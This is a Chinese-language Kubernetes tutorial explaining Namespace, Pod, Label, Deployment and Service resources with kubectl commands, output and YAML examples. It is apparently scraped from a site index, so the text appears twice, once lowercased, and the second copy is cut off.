BestEffort\nNode-Selectors:  <none>\nTolerations:     node.kubernetes.io/not-ready:NoExecute for 300s\n                 node.kubernetes.io/unreachable:NoExecute for 300s\nEvents:\n  Type    Reason     Age        From               Message\n  ----    ------     ----       ----               -------\n  Normal  Scheduled  <unknown>  default-scheduler  Successfully assigned dev/nginx-5ff7956ff6-fg2db to node1\n  Normal  Pulling    4m11s      kubelet, node1     Pulling image "nginx:latest"\n  Normal  Pulled     3m36s      kubelet, node1     Successfully pulled image "nginx:latest"\n  Normal  Created    3m36s      kubelet, node1     Created container nginx\n  Normal  Started    3m36s      kubelet, node1     Started container nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n访问 Pod\n\n# 获取podIP\n[root@master ~]# kubectl get pods -n dev -o wide\nNAME    READY   STATUS    RESTARTS   AGE    IP             NODE    ... \nnginx   1/1     Running   0          190s   10.244.1.23   node1   ...\n\n#访问POD\n[root@master ~]# curl http://10.244.1.23:80\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>Welcome to nginx!</title>\n</head>\n<body>\n\t<p><em>Thank you for using nginx.</em></p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n删除指定 Pod\n\n# 删除指定Pod\n[root@master ~]# kubectl delete pod nginx -n dev\npod "nginx" deleted\n\n# 此时，显示删除Pod成功，但是再查询，发现又新产生了一个 \n[root@master ~]# kubectl get pods -n dev\nNAME    READY   STATUS    RESTARTS   AGE\nnginx   1/1     Running   0          21s\n\n# 这是因为当前Pod是由Pod控制器创建的，控制器会监控Pod状况，一旦发现Pod死亡，会立即重建\n# 此时要想删除Pod，必须删除Pod控制器\n\n# 先来查询一下当前namespace下的Pod控制器\n[root@master ~]# kubectl get deploy -n  dev\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   1/1     1            1           9m7s\n\n# 接下来，删除此PodPod控制器\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n# 稍等片刻，再查询Pod，发现Pod被删除了\n[root@master ~]# kubectl get pods -n dev\nNo resources found in dev namespace.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n配置操作\n创建一个 pod-nginx.yaml，内容如下：\n这种创建方式不会像 kubectl run 在创建 Pod 时会创建 Pod 控制器，以下是不会创建 Pod 控制器的。\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f pod-nginx.yaml\n删除：kubectl delete -f pod-nginx.yaml\n\n\n# Label\n\nLabel 是 kubernetes 系统中的一个重要概念。它的作用就是在资源上添加标识，用来对它们进行区分和选择。\n\nLabel 的特点：\n\n * 一个 Label 会以 key/value 键值对的形式附加到各种对象上，如 Node、Pod、Service 等等\n * 一个资源对象可以定义任意数量的 Label ，同一个 Label 也可以被添加到任意数量的资源对象上去\n * Label 通常在资源对象定义时确定，当然也可以在对象创建后动态添加或者删除\n\n可以通过 Label 实现资源的多维度分组，以便灵活、方便地进行资源分配、调度、配置、部署等管理工作。\n\n> 一些常用的 Label 示例如下：\n> 版本标签："version":"release", "version":"stable"......\n> 环境标签："environment":"dev"，"environment":"test"，"environment":"pro"\n> 架构标签："tier":"frontend"，"tier":"backend"\n\n标签定义完毕之后，还要考虑到标签的选择，这就要使用到 Label Selector，即：\nLabel 用于给某个资源对象定义标识\nLabel Selector 用于查询和筛选拥有某些标签的资源对象\n\n当前有两种 Label Selector：\n\n * 基于等式的 Label Selector\n   name = slave: 选择所有包含 Label 中 key="name" 且 value="slave" 的对象\n   env != production: 选择所有包括 Label 中的 key="env" 且 value 不等于 "production" 的对象\n * 基于集合的 Label Selector\n   name in (master, slave): 选择所有包含 Label 中的 key="name" 且 value="master" 或 "slave" 的对象\n   name not in (frontend): 选择所有包含 Label 中的 key="name" 且 value 不等于 "frontend" 的对象\n\n标签的选择条件可以使用多个，此时将多个 Label Selector 进行组合，使用逗号 "," 进行分隔即可。例如：\nname=slave，env!=production\nname not in (frontend)，env!=production\n\n命令方式\n\n# 为pod资源打标签\n[root@master ~]# kubectl label pod nginx-pod version=1.0 -n dev\npod/nginx-pod labeled\n\n# 为pod资源更新标签\n[root@master ~]# kubectl label pod nginx-pod version=2.0 -n dev --overwrite\npod/nginx-pod labeled\n\n# 查看标签\n[root@master ~]# kubectl get pod nginx-pod  -n dev --show-labels\nNAME        READY   STATUS    RESTARTS   AGE   LABELS\nnginx-pod   1/1     Running   0          10m   version=2.0\n\n# 筛选标签\n[root@master ~]# kubectl get pod -n dev -l version=2.0  --show-labels\nNAME        READY   STATUS    RESTARTS   AGE   LABELS\nnginx-pod   1/1     Running   0          17m   version=2.0\n[root@master ~]# kubectl get pod -n dev -l version!=2.0 --show-labels\nNo resources found in dev namespace.\n\n#删除标签\n[root@master ~]# kubectl label pod nginx-pod version- -n dev\npod/nginx-pod labeled\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n配置方式\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  namespace: dev\n  # 创建时添加标签\n  labels:\n    version: "3.0" \n    env: "test"\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerPort: 80\n      protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n然后就可以执行对应的更新命令了：kubectl apply -f pod-nginx.yaml\n\n\n# Deployment\n\n在 kubernetes 中，Pod 是最小的控制单元，但是 kubernetes 很少直接控制 Pod，一般都是通过 Pod 控制器来完成的。Pod 控制器用于 pod 的管理，确保 pod 资源符合预期的状态，当 pod 的资源出现故障时，会尝试进行重启或重建 pod。\n\n在 kubernetes 中 Pod 控制器的种类有很多，本章节只介绍一种：Deployment。\n\n\n\n命令操作\n\n# 命令格式: kubectl run Deployment名称  [参数] \n# --image  指定pod的镜像\n# --port   指定端口\n# --replicas  指定创建pod数量\n# --namespace  指定namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --replicas=3 -n dev\ndeployment.apps/nginx created\n\n# 查看创建的Pod\n[root@master ~]# kubectl get pods -n dev\nNAME                     READY   STATUS    RESTARTS   AGE\nnginx-5ff7956ff6-6k8cb   1/1     Running   0          19s\nnginx-5ff7956ff6-jxfjt   1/1     Running   0          19s\nnginx-5ff7956ff6-v6jqw   1/1     Running   0          19s\n\n# 查看deployment的信息\n[root@master ~]# kubectl get deploy -n dev\nNAME    READY   UP-TO-DATE   AVAILABLE   AGE\nnginx   3/3     3            3           2m42s\n\n# UP-TO-DATE：成功升级的副本数量\n# AVAILABLE：可用副本的数量\n[root@master ~]# kubectl get deploy -n dev -o wide\nNAME    READY UP-TO-DATE  AVAILABLE   AGE     CONTAINERS   IMAGES              SELECTOR\nnginx   3/3     3         3           2m51s   nginx        nginx:latest        run=nginx\n\n# 查看deployment的详细信息\n[root@master ~]# kubectl describe deploy nginx -n dev\nName:                   nginx\nNamespace:              dev\nCreationTimestamp:      Wed, 08 May 2021 11:14:14 +0800\nLabels:                 run=nginx\nAnnotations:            deployment.kubernetes.io/revision: 1\nSelector:               run=nginx\nReplicas:               3 desired | 3 updated | 3 total | 3 available | 0 unavailable\nStrategyType:           RollingUpdate\nMinReadySeconds:        0\nRollingUpdateStrategy:  25% max unavailable, 25% max surge\nPod Template:\n  Labels:  run=nginx\n  Containers:\n   nginx:\n    Image:        nginx:latest\n    Port:         80/TCP\n    Host Port:    0/TCP\n    Environment:  <none>\n    Mounts:       <none>\n  Volumes:        <none>\nConditions:\n  Type           Status  Reason\n  ----           ------  ------\n  Available      True    MinimumReplicasAvailable\n  Progressing    True    NewReplicaSetAvailable\nOldReplicaSets:  <none>\nNewReplicaSet:   nginx-5ff7956ff6 (3/3 replicas created)\nEvents:\n  Type    Reason             Age    From                   Message\n  ----    ------             ----   ----                   -------\n  Normal  ScalingReplicaSet  5m43s  deployment-controller  Scaled up replicaset nginx-5ff7956ff6 to 3\n  \n# 删除,对应的pod也会删除\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n配置操作\n创建一个 deploy-nginx.yaml，内容如下：\n\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      run: nginx\n  template:\n    metadata:\n      labels:\n        run: nginx\n    spec:\n      containers:\n      - image: nginx:latest\n        name: nginx\n        ports:\n        - containerPort: 80\n          protocol: TCP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f deploy-nginx.yaml\n删除：kubectl delete -f deploy-nginx.yaml\n\n\n# Service\n\n目前已经能够利用 Deployment 来创建一组 Pod 来提供具有高可用性的服务。虽然每个 Pod 都会分配一个单独的 Pod IP，然而却存在如下两问题：\n\n * Pod IP 会随着 Pod 的重建产生变化\n * Pod IP 仅仅是集群内可见的虚拟 IP，外部无法访问\n\n这样对于访问这个服务带来了难度。因此，kubernetes 设计了 Service 来解决这个问题。\n\nService 可以看作是一组同类 Pod 对外的访问接口。借助 Service，应用可以方便地实现服务发现和负载均衡。\n\n\n\n操作一：创建集群内部可访问的 Service\n\n# 暴露Service\n# expose 通过 deploy 查找nginx Pod暴露\n# name 指定名称\n# type 指定类型为集群IP（只有集群内部可以访问），类型有很多\n# port 指定 service 的端口\n# target-port 转发到目标端口\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx1 --type=ClusterIP --port=80 --target-port=80 -n dev\nservice/svc-nginx1 exposed\n\n# 查看service\n[root@master ~]# kubectl get svc svc-nginx1 -n dev -o wide\nNAME         TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)   AGE     SELECTOR\nsvc-nginx1   ClusterIP   10.109.179.231   <none>        80/TCP    3m51s   run=nginx\n\n# 这里产生了一个CLUSTER-IP，这就是service的IP，在Service的生命周期中，这个地址是不会变动的\n# 可以通过这个IP访问当前service对应的POD\n[root@master ~]# curl 10.109.179.231:80\n<!DOCTYPE html>\n<html>\n<head>\n<title>Welcome to nginx!</title>\n</head>\n<body>\n<h1>Welcome to nginx!</h1>\n.......\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n操作二：创建集群外部也可访问的 Service\n上面创建的 Service 的 type 类型为 ClusterIP，这个 ip 地址只用集群内部可访问，如果需要创建外部也可以访问的 Service，需要修改 type 为 NodePort\n\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx2 --type=NodePort --port=80 --target-port=80 -n dev\nservice/svc-nginx2 exposed\n\n# 此时查看，会发现出现了NodePort类型的Service，而且有一对Port（80:31928/TC）\n[root@master ~]# kubectl get svc  svc-nginx2  -n dev -o wide\nNAME          TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)        AGE    SELECTOR\nsvc-nginx2    NodePort    10.100.94.0      <none>        80:31928/TCP   9s     run=nginx\n\n# 接下来就可以通过集群外的主机访问 节点IP:31928访问服务了\n# 例如在的电脑主机上通过浏览器访问下面的地址\nhttp://192.168.5.4:31928/\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n删除 Service\n\n[root@master ~]# kubectl delete svc svc-nginx-1 -n dev service "svc-nginx-1" deleted\n\n\n1\n\n\n配置方式\n创建一个 svc-nginx.yaml，内容如下：\n\napiVersion: v1\nkind: Service\nmetadata:\n  name: svc-nginx\n  namespace: dev\nspec:\n  # 固定svc的内网ip，如果不指定会随机分配\n  clusterIP: 10.109.179.231 \n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 80\n  selector:\n    run: nginx\n  type: ClusterIP\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f svc-nginx.yaml\n删除：kubectl delete -f svc-nginx.yaml',normalizedContent:'# namespace\n\nnamespace 是 kubernetes 系统中的一种非常重要资源，它的主要作用是用来实现多套环境的资源隔离或者多租户的资源隔离。\n\n默认情况下，kubernetes 集群中的所有的 pod 都是可以相互访问的。但是在实际中，可能不想让两个 pod 之间进行互相的访问，那此时就可以将两个 pod 划分到不同的 namespace 下。kubernetes 通过将集群内部的资源分配到不同的 namespace 中，可以形成逻辑上的 "组"，以方便不同的组的资源进行隔离使用和管理。\n\n可以通过 kubernetes 的授权机制，将不同的 namespace 交给不同租户进行管理，这样就实现了多租户的资源隔离。此时还能结合 kubernetes 的资源配额机制，限定不同租户能占用的资源，例如 cpu 使用量、内存使用量等等，来实现租户可用资源的管理。\n\n\n\nkubernetes 在集群启动之后，会默认创建几个 namespace\n\n[root@master ~]# kubectl  get namespace\nname              status   age\ndefault           active   45h     \nkube-node-lease   active   45h  \nkube-public       active   45h     \nkube-system       active   45h    \n\n\n1\n2\n3\n4\n5\n6\n\n * default 所有未指定 namespace 的对象都会被分配在 default 命名空间\n * kube-node-lease 集群节点之间的心跳维护，v1.13 开始引入\n * kube-public 此命名空间下的资源可以被所有人访问（包括未认证用户）\n * kube-system 所有由 kubernetes 系统创建的资源都处于这个命名空间\n\n下面来看 namespace 资源的具体操作：\n查看\n\n# 1 查看所有的ns  命令：kubectl get ns\n[root@master ~]# kubectl get ns\nname              status   age\ndefault           active   45h\nkube-node-lease   active   45h\nkube-public       active   45h     \nkube-system       active   45h     \n\n# 2 查看指定的ns   命令：kubectl get ns ns名称\n[root@master ~]# kubectl get ns default\nname      status   age\ndefault   active   45h\n\n# 3 指定输出格式  命令：kubectl get ns ns名称  -o 格式参数\n# kubernetes支持的格式有很多，比较常见的是wide、json、yaml\n[root@master ~]# kubectl get ns default -o yaml\napiversion: v1\nkind: namespace\nmetadata:\n  creationtimestamp: "2021-05-08t04:44:16z"\n  name: default\n  resourceversion: "151"\n  selflink: /api/v1/namespaces/default\n  uid: 7405f73a-e486-43d4-9db6-145f1409f090\nspec:\n  finalizers:\n  - kubernetes\nstatus:\n  phase: active\n  \n# 4 查看ns详情  命令：kubectl describe ns ns名称\n[root@master ~]# kubectl describe ns default\nname:         default\nlabels:       <none>\nannotations:  <none>\nstatus:       active  # active 命名空间正在使用中  terminating 正在删除命名空间\n\n# resourcequota 针对namespace做的资源限制\n# limitrange针对namespace中的每个组件做的资源限制\nno resource quota.\nno limitrange resource.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n创建\n\n# 创建namespace\n[root@master ~]# kubectl create ns dev\nnamespace/dev created\n\n\n1\n2\n3\n\n\n删除\n\n# 删除namespace\n[root@master ~]# kubectl delete ns dev\nnamespace "dev" deleted\n\n\n1\n2\n3\n\n\n配置方式\n\napiversion: v1\nkind: namespace\nmetadata:\n  name: dev\n\n\n1\n2\n3\n4\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f ns-dev.yaml\n删除：kubectl delete -f ns-dev.yaml\n\n\n# pod\n\npod 是 kubernetes 集群进行管理的最小单元，程序要运行必须部署在容器中，而容器必须存在于 pod 中。pod 可以认为是容器的封装，一个 pod 中可以存在一个或者多个容器。\n\n\n\nkubernetes 在集群启动之后，集群中的各个组件也都是以 pod 方式运行的。可以通过下面命令查看：\n\n[root@master ~]# kubectl get pod -n kube-system\nnamespace     name                             ready   status    restarts   age\nkube-system   coredns-6955765f44-68g6v         1/1     running   0          2d1h\nkube-system   coredns-6955765f44-cs5r8         1/1     running   0          2d1h\nkube-system   etcd-master                      1/1     running   0          2d1h\nkube-system   kube-apiserver-master            1/1     running   0          2d1h\nkube-system   kube-controller-manager-master   1/1     running   0          2d1h\nkube-system   kube-flannel-ds-amd64-47r25      1/1     running   0          2d1h\nkube-system   kube-flannel-ds-amd64-ls5lh      1/1     running   0          2d1h\nkube-system   kube-proxy-685tk                 1/1     running   0          2d1h\nkube-system   kube-proxy-87spt                 1/1     running   0          2d1h\nkube-system   kube-scheduler-master            1/1     running   0          2d1h\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n创建并运行\nkubernetes 没有提供单独运行 pod 的命令，都是通过 pod 控制器来实现的\n\n# 命令格式： kubectl run (pod控制器名称) [参数] \n# --image  指定pod的镜像\n# --port   指定端口\n# --namespace  指定namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --namespace dev \ndeployment.apps/nginx created\n\n\n1\n2\n3\n4\n5\n6\n\n\n查看 pod 信息\n\n# 查看pod基本信息\n[root@master ~]# kubectl get pods -n dev\nname    ready   status    restarts   age\nnginx   1/1     running   0          43s\n\n# 查看pod的详细信息\n[root@master ~]# kubectl describe pod nginx -n dev\nname:         nginx\nnamespace:    dev\npriority:     0\nnode:         node1/192.168.5.4\nstart time:   wed, 08 may 2021 09:29:24 +0800\nlabels:       pod-template-hash=5ff7956ff6\n              run=nginx\nannotations:  <none>\nstatus:       running\nip:           10.244.1.23\nips:\n  ip:           10.244.1.23\ncontrolled by:  replicaset/nginx\ncontainers:\n  nginx:\n    container id:   docker://4c62b8c0648d2512380f4ffa5da2c99d16e05634979973449c98e9b829f6253c\n    image:          nginx:latest\n    image id:       docker-pullable://nginx@sha256:485b610fefec7ff6c463ced9623314a04ed67e3945b9c08d7e53a47f6d108dc7\n    port:           80/tcp\n    host port:      0/tcp\n    state:          running\n      started:      wed, 08 may 2021 09:30:01 +0800\n    ready:          true\n    restart count:  0\n    environment:    <none>\n    mounts:\n      /var/run/secrets/kubernetes.io/serviceaccount from default-token-hwvvw (ro)\nconditions:\n  type              status\n  initialized       true\n  ready             true\n  containersready   true\n  podscheduled      true\nvolumes:\n  default-token-hwvvw:\n    type:        secret (a volume populated by a secret)\n    secretname:  default-token-hwvvw\n    optional:    false\nqos class:       besteffort\nnode-selectors:  <none>\ntolerations:     node.kubernetes.io/not-ready:noexecute for 300s\n                 node.kubernetes.io/unreachable:noexecute for 300s\nevents:\n  type    reason     age        from               message\n  ----    ------     ----       ----               -------\n  normal  scheduled  <unknown>  default-scheduler  successfully assigned dev/nginx-5ff7956ff6-fg2db to node1\n  normal  pulling    4m11s      kubelet, node1     pulling image "nginx:latest"\n  normal  pulled     3m36s      kubelet, node1     successfully pulled image "nginx:latest"\n  normal  created    3m36s      kubelet, node1     created container nginx\n  normal  started    3m36s      kubelet, node1     started container nginx\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\n访问 pod\n\n# 获取podip\n[root@master ~]# kubectl get pods -n dev -o wide\nname    ready   status    restarts   age    ip             node    ... \nnginx   1/1     running   0          190s   10.244.1.23   node1   ...\n\n#访问pod\n[root@master ~]# curl http://10.244.1.23:80\n<!doctype html>\n<html>\n<head>\n\t<title>welcome to nginx!</title>\n</head>\n<body>\n\t<p><em>thank you for using nginx.</em></p>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n删除指定 pod\n\n# 删除指定pod\n[root@master ~]# kubectl delete pod nginx -n dev\npod "nginx" deleted\n\n# 此时，显示删除pod成功，但是再查询，发现又新产生了一个 \n[root@master ~]# kubectl get pods -n dev\nname    ready   status    restarts   age\nnginx   1/1     running   0          21s\n\n# 这是因为当前pod是由pod控制器创建的，控制器会监控pod状况，一旦发现pod死亡，会立即重建\n# 此时要想删除pod，必须删除pod控制器\n\n# 先来查询一下当前namespace下的pod控制器\n[root@master ~]# kubectl get deploy -n  dev\nname    ready   up-to-date   available   age\nnginx   1/1     1            1           9m7s\n\n# 接下来，删除此podpod控制器\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n# 稍等片刻，再查询pod，发现pod被删除了\n[root@master ~]# kubectl get pods -n dev\nno resources found in dev namespace.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n配置操作\n创建一个 pod-nginx.yaml，内容如下：\n这种创建方式不会像 kubectl run 在创建 pod 时会创建 pod 控制器，以下是不会创建 pod 控制器的。\n\napiversion: v1\nkind: pod\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f pod-nginx.yaml\n删除：kubectl delete -f pod-nginx.yaml\n\n\n# label\n\nlabel 是 kubernetes 系统中的一个重要概念。它的作用就是在资源上添加标识，用来对它们进行区分和选择。\n\nlabel 的特点：\n\n * 一个 label 会以 key/value 键值对的形式附加到各种对象上，如 node、pod、service 等等\n * 一个资源对象可以定义任意数量的 label ，同一个 label 也可以被添加到任意数量的资源对象上去\n * label 通常在资源对象定义时确定，当然也可以在对象创建后动态添加或者删除\n\n可以通过 label 实现资源的多维度分组，以便灵活、方便地进行资源分配、调度、配置、部署等管理工作。\n\n> 一些常用的 label 示例如下：\n> 版本标签："version":"release", "version":"stable"......\n> 环境标签："environment":"dev"，"environment":"test"，"environment":"pro"\n> 架构标签："tier":"frontend"，"tier":"backend"\n\n标签定义完毕之后，还要考虑到标签的选择，这就要使用到 label selector，即：\nlabel 用于给某个资源对象定义标识\nlabel selector 用于查询和筛选拥有某些标签的资源对象\n\n当前有两种 label selector：\n\n * 基于等式的 label selector\n   name = slave: 选择所有包含 label 中 key="name" 且 value="slave" 的对象\n   env != production: 选择所有包括 label 中的 key="env" 且 value 不等于 "production" 的对象\n * 基于集合的 label selector\n   name in (master, slave): 选择所有包含 label 中的 key="name" 且 value="master" 或 "slave" 的对象\n   name not in (frontend): 选择所有包含 label 中的 key="name" 且 value 不等于 "frontend" 的对象\n\n标签的选择条件可以使用多个，此时将多个 label selector 进行组合，使用逗号 "," 进行分隔即可。例如：\nname=slave，env!=production\nname not in (frontend)，env!=production\n\n命令方式\n\n# 为pod资源打标签\n[root@master ~]# kubectl label pod nginx-pod version=1.0 -n dev\npod/nginx-pod labeled\n\n# 为pod资源更新标签\n[root@master ~]# kubectl label pod nginx-pod version=2.0 -n dev --overwrite\npod/nginx-pod labeled\n\n# 查看标签\n[root@master ~]# kubectl get pod nginx-pod  -n dev --show-labels\nname        ready   status    restarts   age   labels\nnginx-pod   1/1     running   0          10m   version=2.0\n\n# 筛选标签\n[root@master ~]# kubectl get pod -n dev -l version=2.0  --show-labels\nname        ready   status    restarts   age   labels\nnginx-pod   1/1     running   0          17m   version=2.0\n[root@master ~]# kubectl get pod -n dev -l version!=2.0 --show-labels\nno resources found in dev namespace.\n\n#删除标签\n[root@master ~]# kubectl label pod nginx-pod version- -n dev\npod/nginx-pod labeled\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n配置方式\n\napiversion: v1\nkind: pod\nmetadata:\n  name: nginx\n  namespace: dev\n  # 创建时添加标签\n  labels:\n    version: "3.0" \n    env: "test"\nspec:\n  containers:\n  - image: nginx:latest\n    name: pod\n    ports:\n    - name: nginx-port\n      containerport: 80\n      protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n然后就可以执行对应的更新命令了：kubectl apply -f pod-nginx.yaml\n\n\n# deployment\n\n在 kubernetes 中，pod 是最小的控制单元，但是 kubernetes 很少直接控制 pod，一般都是通过 pod 控制器来完成的。pod 控制器用于 pod 的管理，确保 pod 资源符合预期的状态，当 pod 的资源出现故障时，会尝试进行重启或重建 pod。\n\n在 kubernetes 中 pod 控制器的种类有很多，本章节只介绍一种：deployment。\n\n\n\n命令操作\n\n# 命令格式: kubectl run deployment名称  [参数] \n# --image  指定pod的镜像\n# --port   指定端口\n# --replicas  指定创建pod数量\n# --namespace  指定namespace\n[root@master ~]# kubectl run nginx --image=nginx:latest --port=80 --replicas=3 -n dev\ndeployment.apps/nginx created\n\n# 查看创建的pod\n[root@master ~]# kubectl get pods -n dev\nname                     ready   status    restarts   age\nnginx-5ff7956ff6-6k8cb   1/1     running   0          19s\nnginx-5ff7956ff6-jxfjt   1/1     running   0          19s\nnginx-5ff7956ff6-v6jqw   1/1     running   0          19s\n\n# 查看deployment的信息\n[root@master ~]# kubectl get deploy -n dev\nname    ready   up-to-date   available   age\nnginx   3/3     3            3           2m42s\n\n# up-to-date：成功升级的副本数量\n# available：可用副本的数量\n[root@master ~]# kubectl get deploy -n dev -o wide\nname    ready up-to-date  available   age     containers   images              selector\nnginx   3/3     3         3           2m51s   nginx        nginx:latest        run=nginx\n\n# 查看deployment的详细信息\n[root@master ~]# kubectl describe deploy nginx -n dev\nname:                   nginx\nnamespace:              dev\ncreationtimestamp:      wed, 08 may 2021 11:14:14 +0800\nlabels:                 run=nginx\nannotations:            deployment.kubernetes.io/revision: 1\nselector:               run=nginx\nreplicas:               3 desired | 3 updated | 3 total | 3 available | 0 unavailable\nstrategytype:           rollingupdate\nminreadyseconds:        0\nrollingupdatestrategy:  25% max unavailable, 25% max surge\npod template:\n  labels:  run=nginx\n  containers:\n   nginx:\n    image:        nginx:latest\n    port:         80/tcp\n    host port:    0/tcp\n    environment:  <none>\n    mounts:       <none>\n  volumes:        <none>\nconditions:\n  type           status  reason\n  ----           ------  ------\n  available      true    minimumreplicasavailable\n  progressing    true    newreplicasetavailable\noldreplicasets:  <none>\nnewreplicaset:   nginx-5ff7956ff6 (3/3 replicas created)\nevents:\n  type    reason             age    from                   message\n  ----    ------             ----   ----                   -------\n  normal  scalingreplicaset  5m43s  deployment-controller  scaled up replicaset nginx-5ff7956ff6 to 3\n  \n# 删除,对应的pod也会删除\n[root@master ~]# kubectl delete deploy nginx -n dev\ndeployment.apps "nginx" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\n配置操作\n创建一个 deploy-nginx.yaml，内容如下：\n\napiversion: apps/v1\nkind: deployment\nmetadata:\n  name: nginx\n  namespace: dev\nspec:\n  replicas: 3\n  selector:\n    matchlabels:\n      run: nginx\n  template:\n    metadata:\n      labels:\n        run: nginx\n    spec:\n      containers:\n      - image: nginx:latest\n        name: nginx\n        ports:\n        - containerport: 80\n          protocol: tcp\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n然后就可以执行对应的创建和删除命令了：\n创建：kubectl create -f deploy-nginx.yaml\n删除：kubectl delete -f deploy-nginx.yaml\n\n\n# service\n\n目前已经能够利用 deployment 来创建一组 pod 来提供具有高可用性的服务。虽然每个 pod 都会分配一个单独的 pod ip，然而却存在如下两问题：\n\n * pod ip 会随着 pod 的重建产生变化\n * pod ip 仅仅是集群内可见的虚拟 ip，外部无法访问\n\n这样对于访问这个服务带来了难度。因此，kubernetes 设计了 service 来解决这个问题。\n\nservice 可以看作是一组同类 pod 对外的访问接口。借助 service，应用可以方便地实现服务发现和负载均衡。\n\n\n\n操作一：创建集群内部可访问的 service\n\n# 暴露service\n# expose 通过 deploy 查找nginx pod暴露\n# name 指定名称\n# type 指定类型为集群ip（只有集群内部可以访问），类型有很多\n# port 指定 service 的端口\n# target-port 转发到目标端口\n[root@master ~]# kubectl expose deploy nginx --name=svc-nginx1 --type=clusterip --port=80 --target-port=80 -n dev\nservice/svc-nginx1 exposed\n\n# 查看service\n[root@master ~]# kubectl get svc svc-nginx1 -n dev -o wide\nname         type        cluster-ip       external-ip   port(s)   age     selector\nsvc-nginx1   clusterip   10.109.179.231   